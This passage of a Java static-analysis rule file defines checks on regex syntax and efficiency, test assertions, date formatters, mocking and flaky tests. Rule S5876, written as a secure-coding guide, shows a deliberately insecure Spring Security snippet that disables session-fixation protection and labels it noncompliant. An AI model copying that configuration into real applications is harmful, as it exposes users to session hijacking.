        <tag>regex</tag>
    </rule>

    <rule key='S5856' priority='CRITICAL'>
        <configKey>S5856</configKey>
        <name>Regular expressions should be syntactically valid</name>
        <description>
            &lt;p&gt;Regular expressions have their own syntax that is understood by regular expression engines. Those
            engines will throw an exception at runtime if
            they are given a regular expression that does not conform to that syntax.&lt;/p&gt;
            &lt;p&gt;To avoid syntax errors, special characters should be escaped with backslashes when they are
            intended to be matched literally and references to
            capturing groups should use the correctly spelled name or number of the group.&lt;/p&gt;
            &lt;p&gt;To match a literal string, rather than a regular expression, either all special characters should
            be escaped or the &lt;code&gt;Pattern.LITERAL&lt;/code&gt;
            flag or methods that don't use regular expressions should be used.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;([&quot;);
            str.matches(&quot;([&quot;);
            str.replaceAll(&quot;([&quot;, &quot;{&quot;);
            str.matches(&quot;(\\w+-(\\d+)&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;\\(\\[&quot;);
            Pattern.compile(&quot;([&quot;, Pattern.LITERAL);
            str.equals(&quot;([&quot;);
            str.replace(&quot;([&quot;, &quot;{&quot;);
            str.matches(&quot;(\\w+)-(\\d+)&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5857' priority='MINOR'>
        <configKey>S5857</configKey>
        <name>Character classes should be preferred over reluctant quantifiers in regular expressions</name>
        <description>
            &lt;p&gt;Using reluctant quantifiers (also known as lazy or non-greedy quantifiers) in patterns can often
            lead to needless backtracking, making the regex
            needlessly inefficient and potentially vulnerable to &lt;a href=&quot;https://www.regular-expressions.info/catastrophic.html&quot;&gt;catastrophic
            backtracking&lt;/a&gt;.
            Particularly when using &lt;code&gt;.*?&lt;/code&gt; or &lt;code&gt;.+?&lt;/code&gt; to match anything up to
            some terminating character, it is usually a better idea to
            instead use a greedily or possessively quantified negated character class containing the terminating
            character. For example &lt;code&gt;&amp;lt;.+?&amp;gt;&lt;/code&gt;
            should be replaced with &lt;code&gt;&amp;lt;[^&amp;gt;]++&amp;gt;&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;.+?&amp;gt;
            &quot;.*?&quot;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;[^&amp;gt;]++&amp;gt;
            &quot;[^&quot;]*+&quot;
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;[^&amp;gt;]+&amp;gt;
            &quot;[^&quot;]*&quot;
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule only applies in cases where the reluctant quantifier can easily be replaced with a
            negated character class. That means the repetition has
            to be terminated by a single character or character class. Patterns such as the following, where the
            alternatives without reluctant quantifiers are
            more complicated, are therefore not subject to this rule:&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;!--.*?--&amp;gt;
            /\*.*?\*/
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5860' priority='MAJOR'>
        <configKey>S5860</configKey>
        <name>Names of regular expressions named groups should be used</name>
        <description>
            &lt;p&gt;Why use named groups only to never use any of them later on in the code?&lt;/p&gt;
            &lt;p&gt;This rule raises issues every time named groups are:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; defined but never called anywhere in the code through their name; &lt;/li&gt;
            &lt;li&gt; defined but called elsewhere in the code by their number instead. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String date = &quot;01/02&quot;;

            Pattern datePattern = Pattern.compile(&quot;(?&amp;lt;month&amp;gt;[0-9]{2})/(?&amp;lt;year&amp;gt;[0-9]{2})&quot;);
            Matcher dateMatcher = datePattern.matcher(date);

            if (dateMatcher.matches()) {
            checkValidity(dateMatcher.group(1), dateMatcher.group(2)); // Noncompliant - numbers instead of names of
            groups are used
            checkValidity(dateMatcher.group(&quot;day&quot;)); // Noncompliant - there is no group called &quot;day&quot;
            }

            // ...

            String score = &quot;14:1&quot;;

            Pattern scorePattern = Pattern.compile(&quot;(?&amp;lt;player1&amp;gt;[0-9]+):(?&amp;lt;player2&amp;gt;[0-9]+)&quot;);
            // Noncompliant - named groups are never used
            Matcher scoreMatcher = scorePattern.matcher(score);

            if (scoreMatcher.matches()) {
            checkScore(score);
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String date = &quot;01/02&quot;;

            Pattern datePattern = Pattern.compile(&quot;(?&amp;lt;month&amp;gt;[0-9]{2})/(?&amp;lt;year&amp;gt;[0-9]{2})&quot;);
            Matcher dateMatcher = datePattern.matcher(date);

            if (dateMatcher.matches()) {
            checkValidity(dateMatcher.group(&quot;month&quot;), dateMatcher.group(&quot;year&quot;));
            }

            // ...

            String score = &quot;14:1&quot;;

            Pattern scorePattern = Pattern.compile(&quot;(?&amp;lt;player1&amp;gt;[0-9]+):(?&amp;lt;player2&amp;gt;[0-9]+)&quot;);
            Matcher scoreMatcher = scorePattern.matcher(score);

            if (scoreMatcher.matches()) {
            checkScore(scoreMatcher.group(&quot;player1&quot;));
            checkScore(scoreMatcher.group(&quot;player2&quot;));
            }
            &lt;/pre&gt;
            &lt;p&gt;Or, using dedicated variables instead of group names:&lt;/p&gt;
            &lt;pre&gt;
            String score = &quot;14:1&quot;;

            String player = &quot;([0-9]+)&quot;;
            String gameScore = player + &quot;:&quot; + player;

            Pattern scorePattern = Pattern.compile(gameScore);
            Matcher scoreMatcher = scorePattern.matcher(score);

            if (scoreMatcher.matches()) {
            checkScore(score);
            }
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5863' priority='MAJOR'>
        <configKey>S5863</configKey>
        <name>Assertions should not compare an object to itself</name>
        <description>
            &lt;p&gt;Assertions comparing an object to itself are more likely to be bugs due to developer's
            carelessness.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the actual expression matches the expected expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(actual).isEqualTo(actual); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(actual).isEqualTo(expected);
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;In a unit test validating the &lt;code&gt;equals(...)&lt;/code&gt; and &lt;code&gt;hashCode()&lt;/code&gt;
            methods, it's legitimate to compare an object to itself. This
            rule does not raise an issue for &lt;code&gt;isEqualTo&lt;/code&gt;, &lt;code&gt;assertEquals&lt;/code&gt;
            or &lt;code&gt;hasSameHashCodeAs&lt;/code&gt; when the unit test name contains
            (case insensitive): &lt;code&gt;equal&lt;/code&gt;, &lt;code&gt;hash_?code&lt;/code&gt;, &lt;code&gt;object_?method&lt;/code&gt;.
            For example, in tests with the following names:
            &lt;code&gt;test_equals&lt;/code&gt;, &lt;code&gt;testEqual&lt;/code&gt;, &lt;code&gt;test_hashCode&lt;/code&gt;,
            &lt;code&gt;test_hash_code&lt;/code&gt;, &lt;code&gt;test_object_methods&lt;/code&gt;.&lt;/p&gt;
            &lt;pre&gt;
            class MyClassTest {
            @Test
            void test_equals_and_hash_code() {
            MyClass obj = new MyClass();
            assertThat(obj).isEqualTo(obj); // Compliant
            assertThat(obj).hasSameHashCodeAs(obj); // Compliant
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>tests</tag>
    </rule>

    <rule key='S5866' priority='MAJOR'>
        <configKey>S5866</configKey>
        <name>Case insensitive Unicode regular expressions should enable the “UNICODE_CASE” flag</name>
        <description>
            &lt;p&gt;By default case insensitivity only affects letters in the ASCII range. This can be changed by
            either passing &lt;code&gt;Pattern.UNICODE_CASE&lt;/code&gt; or
            &lt;code&gt;Pattern.UNICODE_CHARACTER_CLASS&lt;/code&gt; as an argument to &lt;code&gt;Pattern.compile&lt;/code&gt;
            or using &lt;code&gt;(?u)&lt;/code&gt; or &lt;code&gt;(?U)&lt;/code&gt; within the
            regex.&lt;/p&gt;
            &lt;p&gt;If not done, regular expressions involving non-ASCII letters will still handle those letters as
            being case sensitive.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;söme pättern&quot;, Pattern.CASE_INSENSITIVE);
            str.matches(&quot;(?i)söme pättern&quot;);
            str.matches(&quot;(?i:söme) pättern&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Pattern.compile(&quot;söme pättern&quot;, Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);
            str.matches(&quot;(?iu)söme pättern&quot;);
            str.matches(&quot;(?iu:söme) pättern&quot;);

            // UNICODE_CHARACTER_CLASS implies UNICODE_CASE
            Pattern.compile(&quot;söme pättern&quot;, Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CHARACTER_CLASS);
            str.matches(&quot;(?iU)söme pättern&quot;);
            str.matches(&quot;(?iU:söme) pättern&quot;);
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5868' priority='MAJOR'>
        <configKey>S5868</configKey>
        <name>Unicode Grapheme Clusters should be avoided inside regex character classes</name>
        <description>
            &lt;p&gt;When placing Unicode &lt;a href=&quot;https://unicode.org/glossary/#grapheme_cluster&quot;&gt;Grapheme
            Clusters&lt;/a&gt; (characters which require to be encoded in
            multiple &lt;a href=&quot;https://unicode.org/glossary/#code_point&quot;&gt;Code Points&lt;/a&gt;) inside a
            character class of a regular expression, this will likely lead
            to unintended behavior.&lt;/p&gt;
            &lt;p&gt;For instance, the grapheme cluster &lt;code&gt;c̈&lt;/code&gt; requires two code points: one for
            &lt;code&gt;'c'&lt;/code&gt;, followed by one for the &lt;em&gt;umlaut&lt;/em&gt;
            modifier &lt;code&gt;'\u{0308}'&lt;/code&gt;. If placed within a character class, such as &lt;code&gt;[c̈]&lt;/code&gt;,
            the regex will consider the character class being the
            enumeration &lt;code&gt;[c\u{0308}]&lt;/code&gt; instead. It will, therefore, match every &lt;code&gt;'c'&lt;/code&gt;
            and every &lt;em&gt;umlaut&lt;/em&gt; that isn't expressed as a
            single codepoint, which is extremely unlikely to be the intended behavior.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue every time Unicode Grapheme Clusters are used within a character class of
            a regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &quot;cc̈d̈d&quot;.replaceAll(&quot;[c̈d̈]&quot;, &quot;X&quot;); // Noncompliant, print &quot;XXXXXX&quot;
            instead of expected &quot;cXXd&quot;.
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &quot;cc̈d̈d&quot;.replaceAll(&quot;c̈|d̈&quot;, &quot;X&quot;); // print &quot;cXXd&quot;
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5869' priority='MAJOR'>
        <configKey>S5869</configKey>
        <name>Character classes in regular expressions should not contain the same character twice</name>
        <description>
            &lt;p&gt;Character classes in regular expressions are a convenient way to match one of several possible
            characters by listing the allowed characters or
            ranges of characters. If the same character is listed twice in the same character class or if the character
            class contains overlapping ranges, this
            has no effect.&lt;/p&gt;
            &lt;p&gt;Thus duplicate characters in a character class are either a simple oversight or a sign that a range
            in the character class matches more than is
            intended or that the author misunderstood how character classes work and wanted to match more than one
            character. A common example of the latter
            mistake is trying to use a range like &lt;code&gt;[0-99]&lt;/code&gt; to match numbers of up to two digits,
            when in fact it is equivalent to &lt;code&gt;[0-9]&lt;/code&gt;.
            Another common cause is forgetting to escape the '&lt;code&gt;-&lt;/code&gt;' character, creating an
            unintended range that overlaps with other characters in the
            character class.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            str.matches(&quot;[0-99]&quot;) // Noncompliant, this won't actually match strings with two digits
            str.matches(&quot;[0-9.-_]&quot;) // Noncompliant, .-_ is a range that already contains 0-9 (as well as
            various other characters such as capital letters)
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            str.matches(&quot;[0-9]{1,2}&quot;)
            str.matches(&quot;[0-9.\\-_]&quot;)
            &lt;/pre&gt;
        </description>
        <tag>regex</tag>
    </rule>

    <rule key='S5876' priority='CRITICAL'>
        <configKey>S5876</configKey>
        <name>A new session should be created during user authentication</name>
        <description>
            &lt;p&gt;Session fixation attacks occur when an attacker can force a legitimate user to use a session ID
            that he knows. To avoid fixation attacks, it's a
            good practice to generate a new session each time a user authenticates and delete/invalidate the existing
            session (the one possibly known by the
            attacker).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;In a Spring Security's context, session fixation protection is enabled by default but can be
            disabled with &lt;code&gt;sessionFixation().none()&lt;/code&gt;
            method:&lt;/p&gt;
            &lt;pre&gt;
            @Override
            protected void configure(HttpSecurity http) throws Exception {
            http.sessionManagement()
            .sessionFixation().none(); // Noncompliant: the existing session will continue
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;In a Spring Security's context, session fixation protection can be enabled as follows:&lt;/p&gt;
            &lt;pre&gt;
            @Override
            protected void configure(HttpSecurity http) throws Exception {
            http.sessionManagement()
            .sessionFixation().newSession(); // Compliant: a new session is created without any of the attributes from
            the old session being copied over

            // or

            http.sessionManagement()
            .sessionFixation().migrateSession(); // Compliant: a new session is created, the old one is invalidated and
            the attributes from the old session are copied over.
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication&quot;&gt;OWASP
            Top 10 2017 Category A2&lt;/a&gt; -
            Broken Authentication &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Session_fixation&quot;&gt;OWASP Sesssion
            Fixation&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/384.html&quot;&gt;MITRE, CWE-384&lt;/a&gt;
            - Session Fixation &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a2</tag>
        <tag>spring</tag>
        <securityStandards>
            <OWASP>A2</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5917' priority='MAJOR'>
        <configKey>S5917</configKey>
        <name>DateTimeFormatters should not use mismatched year and week numbers</name>
        <description>
            &lt;p&gt;When creating a &lt;code&gt;DateTimeFormatter&lt;/code&gt; using the &lt;code&gt;WeekFields.weekBasedYear()&lt;/code&gt;
            temporal field, the resulting year number may be
            off by 1 at the beginning of a new year (when the date to format is in a week that is shared by two
            consecutive years). &lt;/p&gt;
            &lt;p&gt;Using this year number in combination with an incompatible week temporal field yields a result that
            may be confused with the first week of the
            previous year.&lt;/p&gt;
            &lt;p&gt;Instead, when paired with a week temporal field, the week-based year should only be used with the
            week of week-based year temporal field
            &lt;code&gt;WeekFields.weekOfWeekBasedYear()&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;Alternatively the temporal field &lt;code&gt;ChronoField.ALIGNED_WEEK_OF_YEAR&lt;/code&gt; can be
            used together with a regular year (but not the week based
            year).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            new DateTimeFormatterBuilder()
            .appendValue(ChronoField.YEAR, 4) // Noncompliant: using week of week-based year with regular year
            .appendLiteral('-')
            .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
            .toFormatter();

            new DateTimeFormatterBuilder()
            .appendValue(ChronoField.YEAR_OF_ERA, 4) // Noncompliant: using week of week-based year with regular year
            .appendLiteral('-')
            .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
            .toFormatter();

            new DateTimeFormatterBuilder()
            .appendValue(WeekFields.ISO.weekBasedYear(), 4) // Noncompliant: using aligned week of year with week-based
            year
            .appendLiteral('-')
            .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
            .toFormatter();
            &lt;/pre&gt;
            &lt;p&gt;Here the first two formatters would wrongly format the 1st of January 2016 as &quot;2016-53&quot;
            while the last one would format it as &quot;2015-01&quot;&lt;/p&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            new DateTimeFormatterBuilder()
            .appendValue(WeekFields.ISO.weekBasedYear(), 4)
            .appendLiteral('-')
            .appendValue(WeekFields.ISO.weekOfWeekBasedYear(), 2)
            .toFormatter();

            new DateTimeFormatterBuilder()
            .appendValue(ChronoField.YEAR, 4)
            .appendLiteral('-')
            .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
            .toFormatter();

            new DateTimeFormatterBuilder()
            .appendValue(ChronoField.YEAR_OF_ERA, 4)
            .appendLiteral('-')
            .appendValue(ChronoField.ALIGNED_WEEK_OF_YEAR, 2)
            .toFormatter();
            &lt;/pre&gt;
            &lt;p&gt;Here the first formatter would format the 1st of January 2016 as &quot;2015-53&quot; while the last
            two would produce &quot;2016-01&quot;, both of which are correct
            depending on how you count the weeks.&lt;/p&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;No issue is raised when week-based year is not used in combination with a week temporal field.&lt;/p&gt;
            &lt;p&gt;Similarly, no issue is raised if week of week-based year is not used in combination with a year
            temporal field.&lt;/p&gt;
        </description>
    </rule>

    <rule key='S5958' priority='MAJOR'>
        <configKey>S5958</configKey>
        <name>AssertJ &quot;assertThatThrownBy&quot; should not be used alone</name>
        <description>
            &lt;p&gt;Unlike similar AssertJ methods testing exceptions (&lt;code&gt;assertThatCode()&lt;/code&gt;, &lt;code&gt;assertThatExceptionOfType()&lt;/code&gt;,
            ...), the
            &lt;code&gt;assertThatThrownBy()&lt;/code&gt; method can be used alone, failing if the code did not raise
            any exception.&lt;/p&gt;
            &lt;p&gt;Still, only testing that an exception was raised is not enough to guarantee that it was the
            expected one, and you should test the exception type or
            content further. In addition, it will make explicit what you are expecting, without relying on side-effects.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when &lt;code&gt;assertThatThrownBy&lt;/code&gt; is used, without testing
            the exception further.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThatThrownBy(() -&amp;gt; shouldThrow()); // Noncompliant, is it really the exception you expected?
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThatThrownBy(() -&amp;gt; shouldThrow()).isInstanceOf(IOException.class);
            //or
            assertThatThrownBy(() -&amp;gt; shouldThrow()).hasMessage(&quot;My exception&quot;);
            &lt;/pre&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5960' priority='MAJOR'>
        <configKey>S5960</configKey>
        <name>Assertions should not be used in production code</name>
        <description>
            &lt;p&gt;Assertions are intended to be used in &lt;strong&gt;test&lt;/strong&gt; code, but not in &lt;strong&gt;production&lt;/strong&gt;
            code. It is confusing, and might lead to
            &lt;code&gt;ClassNotFoundException&lt;/code&gt; when the build tools only provide the required dependency in
            test scope.&lt;/p&gt;
            &lt;p&gt;In addition, assertions will throw a sub-class of &lt;code&gt;Error&lt;/code&gt;: &lt;code&gt;AssertionError&lt;/code&gt;,
            which should be avoided in production code.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when any assertion intended to be used in test is used in production
            code.&lt;/p&gt;
            &lt;p&gt;Supported frameworks:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit &lt;/li&gt;
            &lt;li&gt; FestAssert &lt;/li&gt;
            &lt;li&gt; AssertJ &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Note: this does not apply for &lt;code&gt;assert&lt;/code&gt; from Java itself or if the source
            code package name is related to tests (contains:
            &lt;code&gt;test&lt;/code&gt; or &lt;code&gt;assert&lt;/code&gt; or &lt;code&gt;junit&lt;/code&gt;).&lt;/p&gt;
        </description>
    </rule>

    <rule key='S5961' priority='MAJOR'>
        <configKey>S5961</configKey>
        <name>Test methods should not contain too many assertions</name>
        <description>
            &lt;p&gt;A common good practice is to write test methods targeting only one logical concept, that can only
            fail for one reason.&lt;/p&gt;
            &lt;p&gt;While it might make sense to have more than one assertion to test one concept, having too many is a
            sign that a test became too complex and should
            be refactored to multiples ones.&lt;/p&gt;
            &lt;p&gt;This rule will report any test method containing more than a given number of assertion.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With a parameter of 2.&lt;/p&gt;
            &lt;pre&gt;
            @Test
            void test() { // Refactor this method.
            assertEquals(1, f(1));
            assertEquals(2, f(2));
            assertEquals(3, g(1));
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void test_f() {
            assertEquals(1, f(1));
            assertEquals(2, f(2));
            }
            void test_g() {
            assertEquals(3, g(1));
            }
            &lt;/pre&gt;
        </description>
        <tag>tests</tag>
        <param>
            <key>MaximumAssertionNumber</key>
            <htmlDesc>The maximum authorized number of assertions in a test method</htmlDesc>
            <defaultValue>25</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S5967' priority='MAJOR'>
        <configKey>S5967</configKey>
        <name>Tests method should not be annotated with competing annotations</name>
        <description>
            &lt;p&gt;Annotating unit tests with more than one test-related annotation is not only useless but could also
            result in unexpected behavior like failing
            tests or unwanted side-effects.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when a test method is annotated with more than one of the following
            competing annotation:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; @Test &lt;/li&gt;
            &lt;li&gt; @RepeatedTest &lt;/li&gt;
            &lt;li&gt; @ParameterizedTest &lt;/li&gt;
            &lt;li&gt; @TestFactory &lt;/li&gt;
            &lt;li&gt; @TestTemplate &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            @RepeatedTest(2) // Noncompliant, this test will be repeated 3 times
            void test() { }

            @ParameterizedTest
            @Test
            @MethodSource(&quot;methodSource&quot;)
            void test2(int argument) { } // Noncompliant, this test will fail with ParameterResolutionException
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @RepeatedTest(2)
            void test() { }

            @ParameterizedTest
            @MethodSource(&quot;methodSource&quot;)
            void test2(int argument) { }
            &lt;/pre&gt;
        </description>
        <tag>tests</tag>
    </rule>

    <rule key='S5969' priority='CRITICAL'>
        <configKey>S5969</configKey>
        <name>Mocking all non-private methods of a class should be avoided</name>
        <description>
            &lt;p&gt;If you end up mocking every non-private method of a class in order to write tests, it is a strong
            sign that your test became too complex, or that
            you misunderstood the way you are supposed to use the mocking mechanism.&lt;/p&gt;
            &lt;p&gt;You should either refactor the test code into multiple units, or consider using the class itself,
            by either directly instantiating it, or creating
            a new one inheriting from it, with the expected behavior.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when every member of a given class are mocked.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            void test_requiring_MyClass() {
            MyClass myClassMock = mock(MyClass.class); // Noncompliant
            when(myClassMock.f()).thenReturn(1);
            when(myClassMock.g()).thenReturn(2);
            //...
            }

            abstract class MyClass {
            abstract int f();
            abstract int g();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Test
            void test_requiring_MyClass() {
            MyClass myClass = new MyClassForTest();
            //...
            }

            class MyClassForTest extends MyClass {

            @Override
            int f() {
            return 1;
            }

            @Override
            int g() {
            return 2;
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            @Test
            void test_requiring_f() {
            MyClass myClassMock = mock(MyClass.class);
            when(myClassMock.f()).thenReturn(1);
            //...
            }

            @Test
            void test_requiring_g() {
            MyClass myClassMock = mock(MyClass.class);
            when(myClassMock.g()).thenReturn(2);
            //...
            }

            abstract class MyClass {
            abstract int f();
            abstract int g();
            }
            &lt;/pre&gt;
        </description>
        <tag>mockito</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5973' priority='MAJOR'>
        <configKey>S5973</configKey>
        <name>Tests should be stable</name>
        <description>
            &lt;p&gt;Unstable / flaky tests are tests which sometimes pass and sometimes fail, without any code change.
            Obviously, they slow down developments when
            engineers have to rerun failed tests. However the real problem is that you can't completely trust these
            tests, they might fail for many different
            reasons and you don't know if any of them will happen in production.&lt;/p&gt;
            &lt;p&gt;Some tools, such as TestNG, enable developers to automatically retry flaky tests. This might be ok
            as a temporary solution, but it should
            definitely be fixed. The more flaky tests you add, the more chances there are for a bug to arrive in
            production.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the annotation &lt;code&gt;org.testng.annotations.Test&lt;/code&gt;
            is given a &lt;code&gt;successPercentage&lt;/code&gt; argument with a
            value lower than &lt;code&gt;100&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.testng.annotations.Test;

            public class PercentageTest {
            @Test(successPercentage = 80, invocationCount = 10) // Noncompliant. The test is allowed to fail 2 times.
            public void flakyTest() {
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://testng.org/doc/documentation-main.html#annotations&quot;&gt;TestNG
            documentation - Annotations&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://engineering.atspotify.com/2019/11/18/test-flakiness-methods-for-identifying-and-dealing-with-flaky-tests/&quot;&gt;Test
            Flakiness -
            Methods for identifying and dealing with flaky tests&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>design</tag>
        <tag>tests</tag>
        <tag>unpredictable</tag>
    </rule>

    <rule key='S5976' priority='MAJOR'>
        <configKey>S5976</configKey>
        <name>Similar tests should be grouped in a single Parameterized test</name>
        <description>
            &lt;p&gt;When multiple tests differ only by a few hardcoded values they should be refactored as a single
            &quot;parameterized&quot; test. This reduces the chances of
            adding a bug and makes them more readable. Parameterized tests exist in most test frameworks (JUnit, TestNG,
            etc...).&lt;/p&gt;
            &lt;p&gt;The right balance needs of course to be found. There is no point in factorizing test methods when
            the parameterized version is a lot more complex
            than initial tests.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when at least 3 tests could be refactored as one parameterized test with
            less than 4 parameters. Only test methods which
            have at least one duplicated statement are considered.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;with JUnit 5&lt;/p&gt;
            &lt;pre&gt;
            import static org.junit.jupiter.api.Assertions.assertEquals;

            import org.junit.jupiter.api.Test;

            public class AppTest
            {
            @Test
            void test_not_null1() { // Noncompliant. The 3 following tests differ only by one hardcoded number.
            setupTax();
            assertNotNull(getTax(1));
            }

            @Test
            void test_not_null2() {
            setupTax();
            assertNotNull(getTax(2));
            }

            @Test
            void test_not_nul3l() {
            setupTax();
            assertNotNull(getTax(3));
            }

            @Test
            void testLevel1() { // Noncompliant. The 3 following tests differ only by a few hardcoded numbers.
            setLevel(1);
            runGame();
            assertEquals(playerHealth(), 100);
            }

            @Test
            void testLevel2() { // Similar test
            setLevel(2);
            runGame();
            assertEquals(playerHealth(), 200);
            }

            @Test
            void testLevel3() { // Similar test
            setLevel(3);
            runGame();
            assertEquals(playerHealth(), 300);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import static org.junit.jupiter.api.Assertions.assertEquals;

            import org.junit.jupiter.params.ParameterizedTest;
            import org.junit.jupiter.params.provider.CsvSource;

            public class AppTest
            {

            @ParameterizedTest
            @ValueSource(ints = {1, 2, 3})
            void test_not_null(int arg) {
            setupTax();
            assertNotNull(getTax(arg));
            }

            @ParameterizedTest
            @CsvSource({
            &quot;1, 100&quot;,
            &quot;2, 200&quot;,
            &quot;3, 300&quot;,
            })
            void testLevels(int level, int health) {
            setLevel(level);
            runGame();
            assertEquals(playerHealth(), health);
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://phauer.com/2019/modern-best-practices-testing-java/#use-parameterized-tests&quot;&gt;Modern
            Best Practices for Testing in Java -
            Philipp Hauer&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests&quot;&gt;JUnit
            5 documentation - Parameterized tests&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.testwithspring.com/lesson/writing-parameterized-tests-with-junit-4/&quot;&gt;Writing
            Parameterized Tests With JUnit 4&lt;/a&gt; &lt;/li&gt;
